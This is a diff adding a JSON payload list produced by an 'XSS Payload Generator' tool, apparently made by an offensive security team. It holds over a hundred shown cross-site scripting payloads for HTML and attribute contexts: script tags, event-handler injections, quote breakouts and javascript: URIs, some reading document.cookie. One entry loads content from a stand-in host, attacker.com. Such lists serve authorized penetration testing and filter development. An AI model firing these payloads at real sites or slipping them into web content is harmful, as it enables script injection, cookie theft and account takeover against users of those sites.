@@ -1,0 +1,2107 @@
+{
+    "generated_at": "2026-02-20T18:30:04.415290",
+    "tool": "XSS Payload Generator",
+    "author": "Offensive Team Zeta - ITSOLERA",
+    "version": "2.0",
+    "warning": "FOR EDUCATIONAL AND AUTHORIZED TESTING ONLY",
+    "payload_count": 233,
+    "payloads": [
+        {
+            "type": "reflected",
+            "context": "html",
+            "original": "<script>alert('XSS')</script>",
+            "encoded": "<script>alert('XSS')</script>",
+            "description": "Basic script tag injection",
+            "severity": "High",
+            "encoding_used": "none"
+        },
+        {
+            "type": "reflected",
+            "context": "html",
+            "original": "<script>alert(1)</script>",
+            "encoded": "<script>alert(1)</script>",
+            "description": "Minimal script alert",
+            "severity": "High",
+            "encoding_used": "none"
+        },
+        {
+            "type": "reflected",
+            "context": "html",
+            "original": "<script>alert(document.domain)</script>",
+            "encoded": "<script>alert(document.domain)</script>",
+            "description": "Display current domain",
+            "severity": "High",
+            "encoding_used": "none"
+        },
+        {
+            "type": "reflected",
+            "context": "html",
+            "original": "<script>alert(document.cookie)</script>",
+            "encoded": "<script>alert(document.cookie)</script>",
+            "description": "Display cookies",
+            "severity": "Critical",
+            "encoding_used": "none"
+        },
+        {
+            "type": "reflected",
+            "context": "html",
+            "original": "<script>confirm('XSS')</script>",
+            "encoded": "<script>confirm('XSS')</script>",
+            "description": "Confirm dialog box",
+            "severity": "High",
+            "encoding_used": "none"
+        },
+        {
+            "type": "reflected",
+            "context": "html",
+            "original": "<script>prompt('XSS')</script>",
+            "encoded": "<script>prompt('XSS')</script>",
+            "description": "Prompt dialog box",
+            "severity": "High",
+            "encoding_used": "none"
+        },
+        {
+            "type": "reflected",
+            "context": "html",
+            "original": "<script>alert(window.origin)</script>",
+            "encoded": "<script>alert(window.origin)</script>",
+            "description": "Display window origin",
+            "severity": "High",
+            "encoding_used": "none"
+        },
+        {
+            "type": "reflected",
+            "context": "html",
+            "original": "<script>alert(document.URL)</script>",
+            "encoded": "<script>alert(document.URL)</script>",
+            "description": "Display document URL",
+            "severity": "High",
+            "encoding_used": "none"
+        },
+        {
+            "type": "reflected",
+            "context": "html",
+            "original": "<script>alert('XSS')//",
+            "encoded": "<script>alert('XSS')//",
+            "description": "Script without closing tag",
+            "severity": "High",
+            "encoding_used": "none"
+        },
+        {
+            "type": "reflected",
+            "context": "html",
+            "original": "<script src=data:,alert(1)>",
+            "encoded": "<script src=data:,alert(1)>",
+            "description": "Script with data URI",
+            "severity": "High",
+            "encoding_used": "none"
+        },
+        {
+            "type": "reflected",
+            "context": "html",
+            "original": "<img src=x onerror=alert('XSS')>",
+            "encoded": "<img src=x onerror=alert('XSS')>",
+            "description": "Image tag with onerror event",
+            "severity": "High",
+            "encoding_used": "none"
+        },
+        {
+            "type": "reflected",
+            "context": "html",
+            "original": "<img src=x onerror=alert(1)>",
+            "encoded": "<img src=x onerror=alert(1)>",
+            "description": "Minimal image onerror",
+            "severity": "High",
+            "encoding_used": "none"
+        },
+        {
+            "type": "reflected",
+            "context": "html",
+            "original": "<img src=x onload=alert('XSS')>",
+            "encoded": "<img src=x onload=alert('XSS')>",
+            "description": "Image tag with onload event",
+            "severity": "High",
+            "encoding_used": "none"
+        },
+        {
+            "type": "reflected",
+            "context": "html",
+            "original": "<img src=x onerror=prompt('XSS')>",
+            "encoded": "<img src=x onerror=prompt('XSS')>",
+            "description": "Image with prompt dialog",
+            "severity": "High",
+            "encoding_used": "none"
+        },
+        {
+            "type": "reflected",
+            "context": "html",
+            "original": "<img src onerror=alert('XSS')>",
+            "encoded": "<img src onerror=alert('XSS')>",
+            "description": "Image without src value",
+            "severity": "High",
+            "encoding_used": "none"
+        },
+        {
+            "type": "reflected",
+            "context": "html",
+            "original": "<img src=/ onerror=alert('XSS')>",
+            "encoded": "<img src=/ onerror=alert('XSS')>",
+            "description": "Image with invalid src",
+            "severity": "High",
+            "encoding_used": "none"
+        },
+        {
+            "type": "reflected",
+            "context": "html",
+            "original": "<img src=javascript:alert('XSS')>",
+            "encoded": "<img src=javascript:alert('XSS')>",
+            "description": "Image with javascript protocol",
+            "severity": "High",
+            "encoding_used": "none"
+        },
+        {
+            "type": "reflected",
+            "context": "html",
+            "original": "<img dynsrc=javascript:alert('XSS')>",
+            "encoded": "<img dynsrc=javascript:alert('XSS')>",
+            "description": "Image with dynsrc attribute",
+            "severity": "Medium",
+            "encoding_used": "none"
+        },
+        {
+            "type": "reflected",
+            "context": "html",
+            "original": "<img lowsrc=javascript:alert('XSS')>",
+            "encoded": "<img lowsrc=javascript:alert('XSS')>",
+            "description": "Image with lowsrc attribute",
+            "severity": "Medium",
+            "encoding_used": "none"
+        },
+        {
+            "type": "reflected",
+            "context": "html",
+            "original": "<img src='x' onerror='alert(1)'>",
+            "encoded": "<img src='x' onerror='alert(1)'>",
+            "description": "Image with quoted attributes",
+            "severity": "High",
+            "encoding_used": "none"
+        },
+        {
+            "type": "reflected",
+            "context": "html",
+            "original": "<img/src=x onerror=alert(1)>",
+            "encoded": "<img/src=x onerror=alert(1)>",
+            "description": "Image with slash separator",
+            "severity": "High",
+            "encoding_used": "none"
+        },
+        {
+            "type": "reflected",
+            "context": "html",
+            "original": "<img src=x:alert(1) onerror=eval(src)>",
+            "encoded": "<img src=x:alert(1) onerror=eval(src)>",
+            "description": "Image with eval in onerror",
+            "severity": "High",
+            "encoding_used": "none"
+        },
+        {
+            "type": "reflected",
+            "context": "html",
+            "original": "<svg onload=alert('XSS')>",
+            "encoded": "<svg onload=alert('XSS')>",
+            "description": "SVG tag with onload event",
+            "severity": "High",
+            "encoding_used": "none"
+        },
+        {
+            "type": "reflected",
+            "context": "html",
+            "original": "<svg onload=alert(1)>",
+            "encoded": "<svg onload=alert(1)>",
+            "description": "Minimal SVG onload",
+            "severity": "High",
+            "encoding_used": "none"
+        },
+        {
+            "type": "reflected",
+            "context": "html",
+            "original": "<svg><script>alert('XSS')</script></svg>",
+            "encoded": "<svg><script>alert('XSS')</script></svg>",
+            "description": "SVG with embedded script",
+            "severity": "High",
+            "encoding_used": "none"
+        },
+        {
+            "type": "reflected",
+            "context": "html",
+            "original": "<svg><animate onbegin=alert('XSS')>",
+            "encoded": "<svg><animate onbegin=alert('XSS')>",
+            "description": "SVG animate with onbegin",
+            "severity": "Medium",
+            "encoding_used": "none"
+        },
+        {
+            "type": "reflected",
+            "context": "html",
+            "original": "<svg><set attributeName=onmouseover to=alert(1)>",
+            "encoded": "<svg><set attributeName=onmouseover to=alert(1)>",
+            "description": "SVG set attribute",
+            "severity": "Medium",
+            "encoding_used": "none"
+        },
+        {
+            "type": "reflected",
+            "context": "html",
+            "original": "<svg/onload=alert(1)>",
+            "encoded": "<svg/onload=alert(1)>",
+            "description": "SVG with slash separator",
+            "severity": "High",
+            "encoding_used": "none"
+        },
+        {
+            "type": "reflected",
+            "context": "html",
+            "original": "<svg onload=alert`1`>",
+            "encoded": "<svg onload=alert`1`>",
+            "description": "SVG with template literals",
+            "severity": "High",
+            "encoding_used": "none"
+        },
+        {
+            "type": "reflected",
+            "context": "html",
+            "original": "<svg><animatetransform onbegin=alert(1)>",
+            "encoded": "<svg><animatetransform onbegin=alert(1)>",
+            "description": "SVG animatetransform",
+            "severity": "Medium",
+            "encoding_used": "none"
+        },
+        {
+            "type": "reflected",
+            "context": "html",
+            "original": "<svg><title><script>alert(1)</script></title>",
+            "encoded": "<svg><title><script>alert(1)</script></title>",
+            "description": "SVG title with script",
+            "severity": "High",
+            "encoding_used": "none"
+        },
+        {
+            "type": "reflected",
+            "context": "html",
+            "original": "<svg><desc><script>alert(1)</script></desc>",
+            "encoded": "<svg><desc><script>alert(1)</script></desc>",
+            "description": "SVG desc with script",
+            "severity": "High",
+            "encoding_used": "none"
+        },
+        {
+            "type": "reflected",
+            "context": "html",
+            "original": "<svg><foreignObject><script>alert(1)</script></foreignObject>",
+            "encoded": "<svg><foreignObject><script>alert(1)</script></foreignObject>",
+            "description": "SVG foreignObject",
+            "severity": "High",
+            "encoding_used": "none"
+        },
+        {
+            "type": "reflected",
+            "context": "html",
+            "original": "<math><mtext><script>alert(1)</script></mtext>",
+            "encoded": "<math><mtext><script>alert(1)</script></mtext>",
+            "description": "MathML with script",
+            "severity": "High",
+            "encoding_used": "none"
+        },
+        {
+            "type": "reflected",
+            "context": "html",
+            "original": "<svg><a><animate attributeName=href values=javascript:alert(1)><text x=20 y=20>Click</text></a>",
+            "encoded": "<svg><a><animate attributeName=href values=javascript:alert(1)><text x=20 y=20>Click</text></a>",
+            "description": "SVG animated href",
+            "severity": "Medium",
+            "encoding_used": "none"
+        },
+        {
+            "type": "reflected",
+            "context": "html",
+            "original": "<svg><script>alert&#40;1&#41;</script>",
+            "encoded": "<svg><script>alert&#40;1&#41;</script>",
+            "description": "SVG script with HTML entities",
+            "severity": "High",
+            "encoding_used": "none"
+        },
+        {
+            "type": "reflected",
+            "context": "html",
+            "original": "<svg xmlns='http://www.w3.org/2000/svg'><script>alert(1)</script></svg>",
+            "encoded": "<svg xmlns='http://www.w3.org/2000/svg'><script>alert(1)</script></svg>",
+            "description": "SVG with namespace",
+            "severity": "High",
+            "encoding_used": "none"
+        },
+        {
+            "type": "reflected",
+            "context": "html",
+            "original": "<iframe src=javascript:alert('XSS')>",
+            "encoded": "<iframe src=javascript:alert('XSS')>",
+            "description": "Iframe with javascript protocol",
+            "severity": "High",
+            "encoding_used": "none"
+        },
+        {
+            "type": "reflected",
+            "context": "html",
+            "original": "<iframe onload=alert('XSS')>",
+            "encoded": "<iframe onload=alert('XSS')>",
+            "description": "Iframe with onload event",
+            "severity": "High",
+            "encoding_used": "none"
+        },
+        {
+            "type": "reflected",
+            "context": "html",
+            "original": "<iframe srcdoc='<script>alert(1)</script>'>",
+            "encoded": "<iframe srcdoc='<script>alert(1)</script>'>",
+            "description": "Iframe with srcdoc attribute",
+            "severity": "High",
+            "encoding_used": "none"
+        },
+        {
+            "type": "reflected",
+            "context": "html",
+            "original": "<iframe src=data:text/html,<script>alert(1)</script>>",
+            "encoded": "<iframe src=data:text/html,<script>alert(1)</script>>",
+            "description": "Iframe with data URI",
+            "severity": "High",
+            "encoding_used": "none"
+        },
+        {
+            "type": "reflected",
+            "context": "html",
+            "original": "<iframe src=javascript:confirm(1)>",
+            "encoded": "<iframe src=javascript:confirm(1)>",
+            "description": "Iframe with confirm",
+            "severity": "High",
+            "encoding_used": "none"
+        },
+        {
+            "type": "reflected",
+            "context": "html",
+            "original": "<iframe src=javascript:prompt(1)>",
+            "encoded": "<iframe src=javascript:prompt(1)>",
+            "description": "Iframe with prompt",
+            "severity": "High",
+            "encoding_used": "none"
+        },
+        {
+            "type": "reflected",
+            "context": "html",
+            "original": "<iframe src=j&#x61;vascript:alert(1)>",
+            "encoded": "<iframe src=j&#x61;vascript:alert(1)>",
+            "description": "Iframe with entity encoding",
+            "severity": "High",
+            "encoding_used": "none"
+        },
+        {
+            "type": "reflected",
+            "context": "html",
+            "original": "<iframe/src=javascript:alert(1)>",
+            "encoded": "<iframe/src=javascript:alert(1)>",
+            "description": "Iframe with slash separator",
+            "severity": "High",
+            "encoding_used": "none"
+        },
+        {
+            "type": "reflected",
+            "context": "html",
+            "original": "<body onload=alert('XSS')>",
+            "encoded": "<body onload=alert('XSS')>",
+            "description": "Body tag with onload event",
+            "severity": "Medium",
+            "encoding_used": "none"
+        },
+        {
+            "type": "reflected",
+            "context": "html",
+            "original": "<body onpageshow=alert('XSS')>",
+            "encoded": "<body onpageshow=alert('XSS')>",
+            "description": "Body tag with onpageshow",
+            "severity": "Medium",
+            "encoding_used": "none"
+        },
+        {
+            "type": "reflected",
+            "context": "html",
+            "original": "<body onhashchange=alert('XSS')>",
+            "encoded": "<body onhashchange=alert('XSS')>",
+            "description": "Body with onhashchange",
+            "severity": "Medium",
+            "encoding_used": "none"
+        },
+        {
+            "type": "reflected",
+            "context": "html",
+            "original": "<body onfocus=alert('XSS')>",
+            "encoded": "<body onfocus=alert('XSS')>",
+            "description": "Body with onfocus",
+            "severity": "Medium",
+            "encoding_used": "none"
+        },
+        {
+            "type": "reflected",
+            "context": "html",
+            "original": "<body onresize=alert('XSS')>",
+            "encoded": "<body onresize=alert('XSS')>",
+            "description": "Body with onresize",
+            "severity": "Low",
+            "encoding_used": "none"
+        },
+        {
+            "type": "reflected",
+            "context": "html",
+            "original": "<body onscroll=alert('XSS')>",
+            "encoded": "<body onscroll=alert('XSS')>",
+            "description": "Body with onscroll",
+            "severity": "Low",
+            "encoding_used": "none"
+        },
+        {
+            "type": "reflected",
+            "context": "html",
+            "original": "<input onfocus=alert('XSS') autofocus>",
+            "encoded": "<input onfocus=alert('XSS') autofocus>",
+            "description": "Input with autofocus and onfocus",
+            "severity": "High",
+            "encoding_used": "none"
+        },
+        {
+            "type": "reflected",
+            "context": "html",
+            "original": "<input onblur=alert('XSS') autofocus><input autofocus>",
+            "encoded": "<input onblur=alert('XSS') autofocus><input autofocus>",
+            "description": "Input with blur event",
+            "severity": "Medium",
+            "encoding_used": "none"
+        },
+        {
+            "type": "reflected",
+            "context": "html",
+            "original": "<select onfocus=alert('XSS') autofocus>",
+            "encoded": "<select onfocus=alert('XSS') autofocus>",
+            "description": "Select with autofocus",
+            "severity": "Medium",
+            "encoding_used": "none"
+        },
+        {
+            "type": "reflected",
+            "context": "html",
+            "original": "<textarea onfocus=alert('XSS') autofocus>",
+            "encoded": "<textarea onfocus=alert('XSS') autofocus>",
+            "description": "Textarea with autofocus",
+            "severity": "Medium",
+            "encoding_used": "none"
+        },
+        {
+            "type": "reflected",
+            "context": "html",
+            "original": "<button onclick=alert('XSS')>Click",
+            "encoded": "<button onclick=alert('XSS')>Click",
+            "description": "Button with onclick",
+            "severity": "Medium",
+            "encoding_used": "none"
+        },
+        {
+            "type": "reflected",
+            "context": "html",
+            "original": "<form><button formaction=javascript:alert(1)>Click",
+            "encoded": "<form><button formaction=javascript:alert(1)>Click",
+            "description": "Button with formaction",
+            "severity": "High",
+            "encoding_used": "none"
+        },
+        {
+            "type": "reflected",
+            "context": "html",
+            "original": "<input type=submit formaction=javascript:alert(1)>",
+            "encoded": "<input type=submit formaction=javascript:alert(1)>",
+            "description": "Submit with formaction",
+            "severity": "High",
+            "encoding_used": "none"
+        },
+        {
+            "type": "reflected",
+            "context": "html",
+            "original": "<input type=image src=x onerror=alert(1)>",
+            "encoded": "<input type=image src=x onerror=alert(1)>",
+            "description": "Image input with onerror",
+            "severity": "High",
+            "encoding_used": "none"
+        },
+        {
+            "type": "reflected",
+            "context": "html",
+            "original": "<form><input type=search onsearch=alert(1) autofocus>",
+            "encoded": "<form><input type=search onsearch=alert(1) autofocus>",
+            "description": "Search input with onsearch",
+            "severity": "Medium",
+            "encoding_used": "none"
+        },
+        {
+            "type": "reflected",
+            "context": "html",
+            "original": "<keygen onfocus=alert(1) autofocus>",
+            "encoded": "<keygen onfocus=alert(1) autofocus>",
+            "description": "Keygen with autofocus",
+            "severity": "Low",
+            "encoding_used": "none"
+        },
+        {
+            "type": "reflected",
+            "context": "html",
+            "original": "<details open ontoggle=alert('XSS')>",
+            "encoded": "<details open ontoggle=alert('XSS')>",
+            "description": "Details tag with ontoggle",
+            "severity": "Medium",
+            "encoding_used": "none"
+        },
+        {
+            "type": "reflected",
+            "context": "html",
+            "original": "<details ontoggle=alert('XSS')><summary>click</summary>",
+            "encoded": "<details ontoggle=alert('XSS')><summary>click</summary>",
+            "description": "Details with summary",
+            "severity": "Medium",
+            "encoding_used": "none"
+        },
+        {
+            "type": "reflected",
+            "context": "html",
+            "original": "<details><summary>click</summary><iframe src=javascript:alert(1)>",
+            "encoded": "<details><summary>click</summary><iframe src=javascript:alert(1)>",
+            "description": "Details with iframe",
+            "severity": "High",
+            "encoding_used": "none"
+        },
+        {
+            "type": "reflected",
+            "context": "html",
+            "original": "<dialog open>XSS</dialog><script>document.querySelector('dialog').onclose=alert(1)</script>",
+            "encoded": "<dialog open>XSS</dialog><script>document.querySelector('dialog').onclose=alert(1)</script>",
+            "description": "Dialog with onclose",
+            "severity": "Medium",
+            "encoding_used": "none"
+        },
+        {
+            "type": "reflected",
+            "context": "html",
+            "original": "<marquee onstart=alert('XSS')>",
+            "encoded": "<marquee onstart=alert('XSS')>",
+            "description": "Marquee with onstart event",
+            "severity": "Low",
+            "encoding_used": "none"
+        },
+        {
+            "type": "reflected",
+            "context": "html",
+            "original": "<object data=javascript:alert('XSS')>",
+            "encoded": "<object data=javascript:alert('XSS')>",
+            "description": "Object with javascript protocol",
+            "severity": "High",
+            "encoding_used": "none"
+        },
+        {
+            "type": "reflected",
+            "context": "html",
+            "original": "<embed src=javascript:alert('XSS')>",
+            "encoded": "<embed src=javascript:alert('XSS')>",
+            "description": "Embed with javascript protocol",
+            "severity": "High",
+            "encoding_used": "none"
+        },
+        {
+            "type": "reflected",
+            "context": "html",
+            "original": "<object data=data:text/html,<script>alert(1)</script>>",
+            "encoded": "<object data=data:text/html,<script>alert(1)</script>>",
+            "description": "Object with data URI",
+            "severity": "High",
+            "encoding_used": "none"
+        },
+        {
+            "type": "reflected",
+            "context": "html",
+            "original": "<embed src=data:text/html,<script>alert(1)</script>>",
+            "encoded": "<embed src=data:text/html,<script>alert(1)</script>>",
+            "description": "Embed with data URI",
+            "severity": "High",
+            "encoding_used": "none"
+        },
+        {
+            "type": "reflected",
+            "context": "html",
+            "original": "<object data='//attacker.com/xss.swf'>",
+            "encoded": "<object data='//attacker.com/xss.swf'>",
+            "description": "Object with Flash SWF",
+            "severity": "High",
+            "encoding_used": "none"
+        },
+        {
+            "type": "reflected",
+            "context": "html",
+            "original": "<embed code=javascript:alert(1)>",
+            "encoded": "<embed code=javascript:alert(1)>",
+            "description": "Embed with code attribute",
+            "severity": "High",
+            "encoding_used": "none"
+        },
+        {
+            "type": "reflected",
+            "context": "html",
+            "original": "<applet code=javascript:alert(1)>",
+            "encoded": "<applet code=javascript:alert(1)>",
+            "description": "Applet with code",
+            "severity": "Medium",
+            "encoding_used": "none"
+        },
+        {
+            "type": "reflected",
+            "context": "html",
+            "original": "<base href=javascript:alert(1)//>",
+            "encoded": "<base href=javascript:alert(1)//>",
+            "description": "Base tag hijack",
+            "severity": "High",
+            "encoding_used": "none"
+        },
+        {
+            "type": "reflected",
+            "context": "html",
+            "original": "<video><source onerror=alert('XSS')>",
+            "encoded": "<video><source onerror=alert('XSS')>",
+            "description": "Video source with onerror",
+            "severity": "Medium",
+            "encoding_used": "none"
+        },
+        {
+            "type": "reflected",
+            "context": "html",
+            "original": "<audio src=x onerror=alert('XSS')>",
+            "encoded": "<audio src=x onerror=alert('XSS')>",
+            "description": "Audio with onerror",
+            "severity": "Medium",
+            "encoding_used": "none"
+        },
+        {
+            "type": "reflected",
+            "context": "html",
+            "original": "<video src=x onerror=alert(1)>",
+            "encoded": "<video src=x onerror=alert(1)>",
+            "description": "Video with onerror",
+            "severity": "Medium",
+            "encoding_used": "none"
+        },
+        {
+            "type": "reflected",
+            "context": "html",
+            "original": "<audio onloadstart=alert(1)>",
+            "encoded": "<audio onloadstart=alert(1)>",
+            "description": "Audio with onloadstart",
+            "severity": "Medium",
+            "encoding_used": "none"
+        },
+        {
+            "type": "reflected",
+            "context": "html",
+            "original": "<video poster=javascript:alert(1)>",
+            "encoded": "<video poster=javascript:alert(1)>",
+            "description": "Video with poster",
+            "severity": "Medium",
+            "encoding_used": "none"
+        },
+        {
+            "type": "reflected",
+            "context": "html",
+            "original": "<video><track kind=subtitles src=data:text/vtt,WEBVTT default>",
+            "encoded": "<video><track kind=subtitles src=data:text/vtt,WEBVTT default>",
+            "description": "Video track XSS",
+            "severity": "High",
+            "encoding_used": "none"
+        },
+        {
+            "type": "reflected",
+            "context": "html",
+            "original": "<link rel=stylesheet href=data:,*%7Bx:expression(alert(1))%7D>",
+            "encoded": "<link rel=stylesheet href=data:,*%7Bx:expression(alert(1))%7D>",
+            "description": "Link with CSS expression",
+            "severity": "Medium",
+            "encoding_used": "none"
+        },
+        {
+            "type": "reflected",
+            "context": "html",
+            "original": "<style>*{x:expression(alert(1))}</style>",
+            "encoded": "<style>*{x:expression(alert(1))}</style>",
+            "description": "Style with CSS expression",
+            "severity": "Medium",
+            "encoding_used": "none"
+        },
+        {
+            "type": "reflected",
+            "context": "html",
+            "original": "<style>@import'javascript:alert(1)';</style>",
+            "encoded": "<style>@import'javascript:alert(1)';</style>",
+            "description": "Style import javascript",
+            "severity": "Medium",
+            "encoding_used": "none"
+        },
+        {
+            "type": "reflected",
+            "context": "html",
+            "original": "<meta http-equiv=refresh content='0;url=javascript:alert(1)'>",
+            "encoded": "<meta http-equiv=refresh content='0;url=javascript:alert(1)'>",
+            "description": "Meta refresh with javascript",
+            "severity": "High",
+            "encoding_used": "none"
+        },
+        {
+            "type": "reflected",
+            "context": "html",
+            "original": "<bgsound src=javascript:alert(1)>",
+            "encoded": "<bgsound src=javascript:alert(1)>",
+            "description": "Bgsound with javascript",
+            "severity": "Low",
+            "encoding_used": "none"
+        },
+        {
+            "type": "reflected",
+            "context": "html",
+            "original": "<frameset onload=alert(1)>",
+            "encoded": "<frameset onload=alert(1)>",
+            "description": "Frameset with onload",
+            "severity": "Medium",
+            "encoding_used": "none"
+        },
+        {
+            "type": "reflected",
+            "context": "html",
+            "original": "<table background=javascript:alert(1)>",
+            "encoded": "<table background=javascript:alert(1)>",
+            "description": "Table background javascript",
+            "severity": "Low",
+            "encoding_used": "none"
+        },
+        {
+            "type": "reflected",
+            "context": "html",
+            "original": "<a href=javascript:alert(1)>click",
+            "encoded": "<a href=javascript:alert(1)>click",
+            "description": "Anchor with javascript protocol",
+            "severity": "Medium",
+            "encoding_used": "none"
+        },
+        {
+            "type": "reflected",
+            "context": "html",
+            "original": "<form action=javascript:alert(1)><input type=submit>",
+            "encoded": "<form action=javascript:alert(1)><input type=submit>",
+            "description": "Form with javascript action",
+            "severity": "High",
+            "encoding_used": "none"
+        },
+        {
+            "type": "reflected",
+            "context": "html",
+            "original": "<isindex type=submit value=XSS formaction=javascript:alert(1)>",
+            "encoded": "<isindex type=submit value=XSS formaction=javascript:alert(1)>",
+            "description": "Isindex formaction",
+            "severity": "Low",
+            "encoding_used": "none"
+        },
+        {
+            "type": "reflected",
+            "context": "attribute",
+            "original": "\" onload=\"alert('XSS')",
+            "encoded": "\" onload=\"alert('XSS')",
+            "description": "Break out of attribute with onload",
+            "severity": "High",
+            "encoding_used": "none"
+        },
+        {
+            "type": "reflected",
+            "context": "attribute",
+            "original": "\" onfocus=\"alert('XSS')\" autofocus=\"",
+            "encoded": "\" onfocus=\"alert('XSS')\" autofocus=\"",
+            "description": "Onfocus with autofocus attribute",
+            "severity": "High",
+            "encoding_used": "none"
+        },
+        {
+            "type": "reflected",
+            "context": "attribute",
+            "original": "\" onmouseover=\"alert('XSS')",
+            "encoded": "\" onmouseover=\"alert('XSS')",
+            "description": "Onmouseover event handler",
+            "severity": "Medium",
+            "encoding_used": "none"
+        },
+        {
+            "type": "reflected",
+            "context": "attribute",
+            "original": "\" onclick=\"alert('XSS')",
+            "encoded": "\" onclick=\"alert('XSS')",
+            "description": "Onclick event handler",
+            "severity": "Medium",
+            "encoding_used": "none"
+        },
+        {
+            "type": "reflected",
+            "context": "attribute",
+            "original": "\" onerror=\"alert('XSS')",
+            "encoded": "\" onerror=\"alert('XSS')",
+            "description": "Onerror event handler",
+            "severity": "High",
+            "encoding_used": "none"
+        },
+        {
+            "type": "reflected",
+            "context": "attribute",
+            "original": "\" onanimationend=\"alert('XSS')",
+            "encoded": "\" onanimationend=\"alert('XSS')",
+            "description": "Onanimationend event",
+            "severity": "Medium",
+            "encoding_used": "none"
+        },
+        {
+            "type": "reflected",
+            "context": "attribute",
+            "original": "\" ontransitionend=\"alert('XSS')",
+            "encoded": "\" ontransitionend=\"alert('XSS')",
+            "description": "Ontransitionend event",
+            "severity": "Medium",
+            "encoding_used": "none"
+        },
+        {
+            "type": "reflected",
+            "context": "attribute",
+            "original": "\" ondrag=\"alert('XSS')",
+            "encoded": "\" ondrag=\"alert('XSS')",
+            "description": "Ondrag event handler",
+            "severity": "Medium",
+            "encoding_used": "none"
+        },
+        {
+            "type": "reflected",
+            "context": "attribute",
+            "original": "\" ondrop=\"alert('XSS')",
+            "encoded": "\" ondrop=\"alert('XSS')",
+            "description": "Ondrop event handler",
+            "severity": "Medium",
+            "encoding_used": "none"
+        },
+        {
+            "type": "reflected",
+            "context": "attribute",
+            "original": "\" onchange=\"alert('XSS')",
+            "encoded": "\" onchange=\"alert('XSS')",
+            "description": "Onchange event handler",
+            "severity": "Medium",
+            "encoding_used": "none"
+        },
+        {
+            "type": "reflected",
+            "context": "attribute",
+            "original": "\" onwheel=\"alert('XSS')",
+            "encoded": "\" onwheel=\"alert('XSS')",
+            "description": "Onwheel event handler",
+            "severity": "Low",
+            "encoding_used": "none"
+        },
+        {
+            "type": "reflected",
+            "context": "attribute",
+            "original": "\" onsubmit=\"alert('XSS')",
+            "encoded": "\" onsubmit=\"alert('XSS')",
+            "description": "Onsubmit event handler",
+            "severity": "High",
+            "encoding_used": "none"
+        },
+        {
+            "type": "reflected",
+            "context": "attribute",
+            "original": "\" oninput=\"alert('XSS')",
+            "encoded": "\" oninput=\"alert('XSS')",
+            "description": "Oninput event handler",
+            "severity": "Medium",
+            "encoding_used": "none"
+        },
+        {
+            "type": "reflected",
+            "context": "attribute",
+            "original": "\" onsearch=\"alert('XSS')",
+            "encoded": "\" onsearch=\"alert('XSS')",
+            "description": "Onsearch event handler",
+            "severity": "Medium",
+            "encoding_used": "none"
+        },
+        {
+            "type": "reflected",
+            "context": "attribute",
+            "original": "\" onkeydown=\"alert('XSS')",
+            "encoded": "\" onkeydown=\"alert('XSS')",
+            "description": "Onkeydown event handler",
+            "severity": "Medium",
+            "encoding_used": "none"
+        },
+        {
+            "type": "reflected",
+            "context": "attribute",
+            "original": "\"><script>alert('XSS')</script>",
+            "encoded": "\"><script>alert('XSS')</script>",
+            "description": "Close tag and inject script",
+            "severity": "High",
+            "encoding_used": "none"
+        },
+        {
+            "type": "reflected",
+            "context": "attribute",
+            "original": "\"><img src=x onerror=alert('XSS')>",
+            "encoded": "\"><img src=x onerror=alert('XSS')>",
+            "description": "Close tag and inject image",
+            "severity": "High",
+            "encoding_used": "none"
+        },
+        {
+            "type": "reflected",
+            "context": "attribute",
+            "original": "\"><svg onload=alert('XSS')>",
+            "encoded": "\"><svg onload=alert('XSS')>",
+            "description": "Close tag and inject SVG",
+            "severity": "High",
+            "encoding_used": "none"
+        },
+        {
+            "type": "reflected",
+            "context": "attribute",
+            "original": "\"><iframe src=javascript:alert('XSS')>",
+            "encoded": "\"><iframe src=javascript:alert('XSS')>",
+            "description": "Close tag and inject iframe",
+            "severity": "High",
+            "encoding_used": "none"
+        },
+        {
+            "type": "reflected",
+            "context": "attribute",
+            "original": "\"><body onload=alert('XSS')>",
+            "encoded": "\"><body onload=alert('XSS')>",
+            "description": "Close tag and inject body",
+            "severity": "Medium",
+            "encoding_used": "none"
+        },
+        {
+            "type": "reflected",
+            "context": "attribute",
+            "original": "\"><input onfocus=alert('XSS') autofocus>",
+            "encoded": "\"><input onfocus=alert('XSS') autofocus>",
+            "description": "Close tag and inject input",
+            "severity": "High",
+            "encoding_used": "none"
+        },
+        {
+            "type": "reflected",
+            "context": "attribute",
+            "original": "\"><video src=x onerror=alert('XSS')>",
+            "encoded": "\"><video src=x onerror=alert('XSS')>",
+            "description": "Close tag and inject video",
+            "severity": "Medium",
+            "encoding_used": "none"
+        },
+        {
+            "type": "reflected",
+            "context": "attribute",
+            "original": "\"><audio src=x onerror=alert('XSS')>",
+            "encoded": "\"><audio src=x onerror=alert('XSS')>",
+            "description": "Close tag and inject audio",
+            "severity": "Medium",
+            "encoding_used": "none"
+        },
+        {
+            "type": "reflected",
+            "context": "attribute",
+            "original": "\"><object data=javascript:alert('XSS')>",
+            "encoded": "\"><object data=javascript:alert('XSS')>",
+            "description": "Close tag and inject object",
+            "severity": "High",
+            "encoding_used": "none"
+        },
+        {
+            "type": "reflected",
+            "context": "attribute",
+            "original": "\"><embed src=javascript:alert('XSS')>",
+            "encoded": "\"><embed src=javascript:alert('XSS')>",
+            "description": "Close tag and inject embed",
+            "severity": "High",
+            "encoding_used": "none"
+        },
+        {
+            "type": "reflected",
+            "context": "attribute",
+            "original": "' onload='alert(\"XSS\")'",
+            "encoded": "' onload='alert(\"XSS\")'",
+            "description": "Single quote breakout",
+            "severity": "High",
+            "encoding_used": "none"
+        },
+        {
+            "type": "reflected",
+            "context": "attribute",
+            "original": "' onfocus='alert(\"XSS\")' autofocus='",
+            "encoded": "' onfocus='alert(\"XSS\")' autofocus='",
+            "description": "Single quote with autofocus",
+            "severity": "High",
+            "encoding_used": "none"
+        },
+        {
+            "type": "reflected",
+            "context": "attribute",
+            "original": "' onclick='alert(\"XSS\")'",
+            "encoded": "' onclick='alert(\"XSS\")'",
+            "description": "Single quote onclick",
+            "severity": "Medium",
+            "encoding_used": "none"
+        },
+        {
+            "type": "reflected",
+            "context": "attribute",
+            "original": "' onerror='alert(\"XSS\")'",
+            "encoded": "' onerror='alert(\"XSS\")'",
+            "description": "Single quote onerror",
+            "severity": "High",
+            "encoding_used": "none"
+        },
+        {
+            "type": "reflected",
+            "context": "attribute",
+            "original": "' onmouseover='alert(\"XSS\")'",
+            "encoded": "' onmouseover='alert(\"XSS\")'",
+            "description": "Single quote onmouseover",
+            "severity": "Medium",
+            "encoding_used": "none"
+        },
+        {
+            "type": "reflected",
+            "context": "attribute",
+            "original": "'><script>alert(\"XSS\")</script>",
+            "encoded": "'><script>alert(\"XSS\")</script>",
+            "description": "Single quote tag close",
+            "severity": "High",
